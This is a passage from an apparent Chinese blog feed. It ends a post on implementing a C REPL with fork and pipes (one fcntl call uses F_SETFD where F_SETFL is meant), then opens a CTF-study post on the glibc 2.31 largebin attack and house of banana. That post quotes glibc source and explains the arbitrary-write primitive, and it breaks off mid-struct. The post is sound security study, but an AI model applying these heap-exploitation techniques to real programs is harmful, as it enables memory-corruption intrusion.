href="#父进程与子进程通信-1" class="headerlink" title="父进程与子进程通信"></a>父进程与子进程通信</h4><p>  实际上，这里有两次父进程与子进程通信——编译包装的表达式为动态链接库，其和处理函数部分的完全一样，不过多赘述；执行包装函数，这里详细说明一下。</p><p>  目前，经过前面解析动态链接文件，此时我们已经有了包装的表达式的内存地址，因此直接将该地址当做一个函数指针，然后调用即可。</p><p>  其建立父、子进程通信的方式和前面完全一样，就不过多赘述。<br>  但是其父、子进程通信的方式和前面略微不太一样。父进程根据<code>waitpid(pid, &amp;wstatus, 0)</code>的<strong>wstatus</strong>值判断程序是否异常，而不需要再与<strong>WEXITSTATUS(wstatus)</strong>——如果<code>WIFEXITED(wstatus)</code>为真，则管道中输出的就是一个<strong>int</strong>类型的二进制数据，也就是表达式的结果；否则，其一定被信号终止，则输出中断的信号信息即可</p><p>  其最终的逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 执行包装函数</span></span><br><span class="line"><span class="comment"> * 也就是symbols[symbols_size - 1]对应的符号</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 最终返回的结果，通过管道写端输出即可，这里输出的直接是二进制数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">child_execute</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strcmp</span>(symbols[symbols_size - <span class="number">1</span>].name, wrapper_name) != <span class="number">0</span>) &#123; kill(getpid(), SIGKILL); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> res = ((<span class="type">int</span> (*)(<span class="type">void</span>))symbols[symbols_size - <span class="number">1</span>].addr)();</span><br><span class="line">  write(pipefd[<span class="number">1</span>], &amp;res, <span class="keyword">sizeof</span>(res));</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 通过查看waitpid中的状态信息，判断是正常返回，还是异常结束</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 如果WIFEXITED(wstatus)为true，则通过管道读端，获取最终结果</span></span><br><span class="line"><span class="comment"> * 否则，则输出WTERMSIG对应值即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">deal_child_result</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *line, <span class="type">const</span> <span class="type">int</span> wstatus, <span class="type">const</span> <span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置读管道文件描述符为非阻塞模式</span></span><br><span class="line"><span class="keyword">if</span>(fcntl(fd, F_SETFD, O_NONBLOCK) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(WIFEXITED(wstatus)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里子进程执行成功，通过error获取其最终结果</span></span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>, read_size = <span class="number">0</span>, res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((read_size = read(fd, buf + size, BUF_SIZE - <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(read_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        size += read_size;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      usleep(READ_GAP);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size != <span class="keyword">sizeof</span>(<span class="type">int</span>)) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, <span class="string">&quot;internal error&quot;</span>);</span><br><span class="line">      crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = *(<span class="type">int</span>*)buf;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;(%s) == %d.\n&quot;</span>, line, res);</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_SUCCESS, buf);</span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里子进程异常，则获取其中断信号量</span></span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strsignal(WTERMSIG(wstatus)));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即捕获子进程的返回状态，从而完成输出即可</span></span><br><span class="line"><span class="comment"> * 类似于前面子进程编译共享链接库的方式</span></span><br><span class="line"><span class="comment"> * 直接waitpid，等待子进程结束即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">deal_child_execute</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *line, <span class="type">const</span> <span class="type">int</span> pid)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> wstatus, res;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//关闭不会使用的管道写端</span></span><br><span class="line">  <span class="keyword">if</span>(close(pipefd[<span class="number">1</span>]) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//等待子进程退出或被中断</span></span><br><span class="line">  <span class="keyword">if</span>(waitpid(pid, &amp;wstatus, <span class="number">0</span>) != pid) &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 处理子进程执行的结果</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  deal_child_result(line, wstatus, pipefd[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 完成包装函数的执行</span></span><br><span class="line"><span class="comment"> * 并且根据包装函数的返回值，输出相关的信息即可 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">do_execute</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *line)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 首先初始化管道文件符号</span></span><br><span class="line"><span class="comment">   * 如果初始化失败</span></span><br><span class="line"><span class="comment">   * 直接输出提示信息并且返回即可</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>(pipe(pipefd) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//初始化失败，则输出错误信息即可</span></span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">    crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">    <span class="keyword">goto</span> DO_EXECUTE_DESTRUCT;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(pid = fork()) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">      <span class="comment">//即fork失败</span></span><br><span class="line">      <span class="built_in">snprintf</span>(buf, BUF_SIZE, <span class="string">&quot;%s\n&quot;</span>, strerror(errno));</span><br><span class="line">      crepl_print(CREPL_PRINT_MODE_FAIL, buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="comment">//执行包装函数并返回其状态信息</span></span><br><span class="line">      child_execute();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//获取子进程的返回信息，并输出</span></span><br><span class="line">      deal_child_execute(line, pid);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">DO_EXECUTE_DESTRUCT:</span><br><span class="line">  close(pipefd[<span class="number">0</span>]);</span><br><span class="line">  close(pipefd[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>  下面是最终的程序的测试结果<br>  <img src="实验结果.png" alt="实验结果"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc2.31下largebin攻击</title>
      <link href="/2021/10/21/glibc2-31%E4%B8%8Blargebin%E6%94%BB%E5%87%BB/"/>
      <url>/2021/10/21/glibc2-31%E4%B8%8Blargebin%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  之前打天翼杯线下的时候，遇到了一道pwn题完全没思路，查资料的过程中发现，好家伙，怎么House of系列攻击有更新了这么多类别，细看发现大多是largebin attack相关的。因此特别整理了一期博客进行学习</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>  实际上largebin attack的原理十分简单，就是检查不严格，其漏洞代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* malloc/malloc.c:  */</span></span><br><span class="line"></span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line"><span class="comment">/* 后面代码部分省略</span></span><br></pre></td></tr></table></figure></p><p>  这是在<strong>malloc</strong>过程中，将<strong>unsorted bin</strong>的chunk卸下部分的代码，如果卸下的chunk大小位于<strong>largebin</strong>，并且是该bin中大小最小的，则会执行这部分代码。如果我们可以控制<strong>bck-&gt;fd_nextsize</strong>字段值，则可以在任意地址处写入一个<strong>largebin</strong>的地址</p><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><p>  当然，<strong>largebin attack</strong>的作用仅仅是向一个任意地址写一个<strong>largebin</strong>地址。因此其一定需要配合其他方法，从而一起完成一次攻击，目前主要的有<strong>house of banana</strong>和<strong>house of pig</strong></p><h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>  <strong>house of banana</strong>主要通过更改<strong>_rtld_global</strong>结构，从而劫持了<strong>_dl_fini</strong>。当程序<strong>exit</strong>或正常退出<strong>main</strong>函数时，则会执行到伪造的<strong>fini_array</strong>数组。一般可以配合<strong>setcontext</strong>函数，从而完成相关的rop构建</p><p>  <strong>_rtld_global</strong>符号是<strong>rtld_global</strong>类型的，其定义如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sysdeps/generic/ldsodefs.h */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EXTERN extern</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _##name</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EXTERN</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> hashval;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="type">size_t</span> size;</span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="type">void</span> (*<span class="built_in">free</span>) (<span class="type">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* During the program run we must not modify the global data of</span></span><br><span class="line"><span class="comment">     loaded shared object simultanously in two threads.  Therefore we</span></span><br><span class="line"><span class="comment">     protect `_dl_open&#x27; and `_dl_close&#x27; in dl-close.c.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     This must be a recursive lock since the initializer function of</span></span><br><span class="line"><span class="comment">     the loaded object might as well require a call to this function.</span></span><br><span class="line"><span class="comment">     At this time it is not anymore a problem to modify the tables.  */</span></span><br><span class="line">  __rtld_lock_define_recursive (EXTERN, _dl_load_lock)</span><br><span class="line">  <span class="comment">/* This lock is used to keep __dl_iterate_phdr from inspecting the</span></span><br><span class="line"><span class="comment">     list of loaded objects while an object is added to or removed</span></span><br><span class="line"><span class="comment">     from that list.  */</span></span><br><span class="line">  __rtld_lock_define_recursive (EXTERN, _dl_load_write_lock)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Incremented whenever something may have been added to dl_loaded.  */</span></span><br><span class="line">  EXTERN <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> _dl_load_adds;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The object to be initialized first.  */</span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">dl_initfirst</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Map of shared object to be profiled.  */</span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">dl_profile_map</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counters for the number of relocations performed.  */</span></span><br><span class="line">  EXTERN <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> _dl_num_relocations;</span><br><span class="line">  EXTERN <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> _dl_num_cache_relocations;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* List of search directories.  */</span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_elem</span> *_<span class="title">dl_all_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Structure describing the dynamic linker itself.  */</span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> _<span class="title">dl_rtld_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Used to store the audit information for the link map of the</span></span><br><span class="line"><span class="comment">     